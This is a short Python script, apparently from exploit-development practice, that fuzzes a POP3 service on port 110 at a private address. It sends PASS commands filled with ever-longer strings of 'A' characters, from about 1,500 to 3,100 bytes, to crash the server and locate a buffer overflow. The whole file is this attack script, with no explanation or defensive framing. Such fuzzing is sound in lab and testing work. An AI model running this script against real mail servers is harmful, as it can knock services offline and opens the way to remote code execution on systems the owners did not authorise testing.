#! /usr/bin/env python3

import socket

# Destination information #
DEST_IP = '10.192.0.235'
DEST_PORT = 110

# VARIABLES #
pw_buf = ["\x41"]
counter = 1300

# STATICS #
STEP = 200
BUF_LENGTH = 10


for x in range(1,BUF_LENGTH):
	counter = counter+STEP #Extending the string in the buffer 
	pw_buf.append("\x41"*counter)

def send_data(socket, text):
	socket.send((text+'\r\n').encode())

for pw in pw_buf:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print("Sending buffer with size: %s" %len(pw))
	s.connect((DEST_IP, DEST_PORT))
	print (s.recv(1024))

	send_data(s, 'USER test')
	send_data(s, 'PASS ' + pw)
	send_data(s, 'QUIT')

	s.close()
	print("All done\n")
	
